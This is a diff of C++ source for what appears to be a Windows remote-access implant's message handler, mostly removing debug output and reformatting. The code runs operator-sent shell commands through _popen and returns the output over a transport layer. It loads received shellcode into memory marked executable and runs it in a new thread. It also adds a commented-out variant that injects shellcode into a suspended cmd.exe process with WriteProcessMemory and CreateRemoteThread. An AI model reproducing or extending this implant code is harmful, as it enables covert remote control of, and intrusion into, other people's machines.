@@ -18,17 +18,16 @@
 MessageHandler::MessageHandler()
 	: transportLayer_(nullptr)
 {
-	std::cout << "inside messagehandler default constructor" << std::endl;
+	// debug statement
 }
 
 MessageHandler::~MessageHandler()
 {
-	std::cout << "messagehandler deconstructor" << std::endl;
+	// debug statement
 }
 
 bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 {
-	std::cout << "=== EXECUTE COMMAND START ===" << std::endl;
 	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
 
 
@@ -36,23 +35,15 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
 	//		 then skip the queue and send the message immediately 
 
-	std::cout << "transportLayer_ pointer: " << transportLayer_ << std::endl;
 	if (!transportLayer_)
 	{
 		std::cout << "ERROR: transportLayer_ is NULL!" << std::endl;
 		return false;
 	}
-	// Check if we can access the transport layer
-	std::cout << "TransportLayer connected: " << transportLayer_->isConnected() << std::endl;
-	// Test: Call a simple method on transportLayer_
-	std::cout << "Testing transportLayer_ access..." << std::endl;
-	bool test = transportLayer_->isConnected();  // Simple method call
-	std::cout << "Test call successful: " << test << std::endl;
+
 
 	std::string command = byte2string(data).c_str();
 	std::string result;
-	
-
 
 	// EASIEST METHOD - just use _popen directly
 	FILE* pipe = _popen(command.c_str(), "r");
@@ -73,74 +64,109 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
 	std::cout << result << std::endl;
 
-	std::cout << "Command result size: " << result.size() << std::endl;
-	std::cout << "Command result: " << result << std::endl;
-
 	// TODO: props should make a separate function for InternalMessage generation
 	InternalMessage outMsg;
 	outMsg.data = string2byte(result);
-	std::cout << "outMsg.data size: " << outMsg.data.size() << std::endl;
-	std::cout << "outMsg.data valid: " << !outMsg.data.empty() << std::endl;
 
 	MessageHeader header;
 	header.messageType = MessageType::COMMAND_RESULT;
 	header.messageId = 105; // TODO: 
 	header.dataSize = outMsg.data.size();
-	std::cout << "Header - type: " << static_cast<int>(header.messageType)
-		<< ", id: " << header.messageId
-		<< ", dataSize: " << header.dataSize << std::endl;
 	outMsg.header = header;
-	std::cout << "About to call sendMessage..." << std::endl;
-	bool sendResult = transportLayer_->sendMessage(outMsg);
-	std::cout << "sendMessage result: " << sendResult << std::endl;
 
-	std::cout << "=== EXECUTE COMMAND END ===" << std::endl;
+	bool sendResult = transportLayer_->sendMessage(outMsg);
 	return sendResult;
 }
 
-//bool MessageHandler::executeShellcode(std::vector<uint8_t>& data)
 bool MessageHandler::executeShellcode(InternalMessage& msg)
 {
 	std::cout << "executeShellcode" << std::endl;
-    LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!shellMem) // TODO: checking if it is NULL would be more correct?
+	LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
-        // DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
+		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
 		return false;
-    }
-
-    // memcpy(beacon_mem, shellcode, bytes_received);
-	// TODO: copy 8 bytes at a time, and then copy left over
-	for (unsigned int i = 0; i < msg.header.dataSize; ++i) 
-	{
-		((char *)shellMem)[i] = msg.data[i];
 	}
 
-    // EXECUTE_READ.
-    DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
-    // NOTE: virtualProtect is also being called somewhere in the windows api
-    if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
-    {
-        // Fail silently if we cannot make the memory executable.
-        return false;
-    }
-
-    // DEBUG_PRINT("6 - Memory allocated and copied");
-
-    // 4.
-    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
-    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
-    if (!thread) 
+	// memcpy(beacon_mem, shellcode, bytes_received);
+	// TODO: copy 8 bytes at a time, and then copy left over
+	for (unsigned int i = 0; i < msg.header.dataSize; ++i)
 	{
-        // DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
-        return false;
-    }
+		((char*)shellMem)[i] = msg.data[i];
+	}
 
-    // DEBUG_PRINT("7 - Thread created, waiting..."); 
-    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	// EXECUTE_READ.
+	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
+	// NOTE: virtualProtect is also being called somewhere in the windows api
+	if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	{
+		// Fail silently if we cannot make the memory executable.
+		return false;
+	}
+
+	// DEBUG_PRINT("6 - Memory allocated and copied");
+
+	// 4.
+	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	if (!thread)
+	{
+		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
+		return false;
+	}
+
+	// DEBUG_PRINT("7 - Thread created, waiting..."); 
+	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
 
 	return true;
 }
+
+
+/* NOTE: creating seperate process entirely
+bool MessageHandler::executeShellcode(InternalMessage& msg)
+{
+	std::cout << "executeShellcode in separate process" << std::endl;
+
+	// Create a temporary process to host the shellcode
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+
+	wchar_t cmdline[] = L"cmd.exe /c timeout 1 > nul";  // Dummy process
+
+	if (CreateProcess(NULL, cmdline, NULL, NULL, FALSE,
+		CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+	{
+		// Allocate memory in the remote process
+		LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, msg.header.dataSize,
+			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		if (remoteMem)
+		{
+			// Write shellcode to remote process
+			WriteProcessMemory(pi.hProcess, remoteMem, msg.data.data(), msg.header.dataSize, NULL);
+
+			// Create remote thread to execute shellcode
+			HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
+				(LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+			if (remoteThread)
+			{
+				// Wait for shellcode to complete (with timeout)
+				WaitForSingleObject(remoteThread, 10000);
+				CloseHandle(remoteThread);
+			}
+		}
+
+		// Clean up the temporary process
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+
+		std::cout << "Shellcode executed in separate process" << std::endl;
+		return true;
+	}
+
+	std::cout << "Failed to create separate process" << std::endl;
+	return false;
+}*/
 
 
 bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
@@ -212,12 +238,6 @@ void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
 {
 	transportLayer_ = &transportLayer;
 }
-
-/*
-void MessageHandler::setTransporter(Transporter& transporter)
-{
-	transporter_ = &transporter;
-}*/
 
 std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
 {
